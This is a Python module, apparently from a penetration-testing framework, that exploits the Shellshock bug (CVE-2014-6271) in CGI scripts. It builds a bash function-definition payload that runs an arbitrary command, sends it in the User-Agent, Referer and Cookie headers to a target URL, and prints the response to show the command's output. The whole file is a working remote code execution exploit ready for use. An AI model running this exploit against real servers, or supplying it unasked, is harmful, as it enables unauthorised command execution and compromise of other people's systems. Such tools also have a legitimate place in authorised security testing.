import requests
from urllib.parse import urljoin
from core.base_module import BaseModule
from rich.console import Console

class ShellshockRce(BaseModule):
    """Exploits the Shellshock vulnerability (CVE-2014-6271) in CGI scripts."""

    def get_options(self):
        """
        Returns the options for this module.
        """
        return {
            'URL': ['', 'The target URL of a vulnerable CGI script (e.g., http://target.com/cgi-bin/status).'],
            'CMD': ['id', 'The command to execute on the target.']
        }

    def run(self, options):
        """
        Executes the Shellshock exploit.
        """
        target_url = options.get('URL')
        cmd = options.get('CMD')
        console = Console()

        if not target_url:
            console.print("[!] URL must be set.", style="bold red")
            return

        # The Shellshock payload
        payload = f"() {{ :; }}; echo; echo; /bin/bash -c '{cmd}'"
        headers = {
            'User-Agent': payload,
            'Referer': payload,
            'Cookie': payload
        }

        console.print(f"[*] Targeting URL: {target_url}")
        console.print(f"[*] Sending Shellshock payload in headers...")

        try:
            response = requests.get(target_url, headers=headers, timeout=20, verify=False)

            # The output of the command is often in the body of the response
            if response.text:
                console.print("[bold green][+] Received response. The command may have executed.[/bold green]")
                console.print(f"--- Response Body ---\n{response.text.strip()}\n---------------------")
                console.print("[*] Manually inspect the output for command execution results.")
            else:
                console.print("[!] Received an empty response. The target may not be vulnerable or the command produced no output.", style="yellow")

        except requests.RequestException as e:
            console.print(f"[!] Request failed: {e}", style="bold red")
        except Exception as e:
            console.print(f"[!] An unexpected error occurred: {e}", style="bold red")
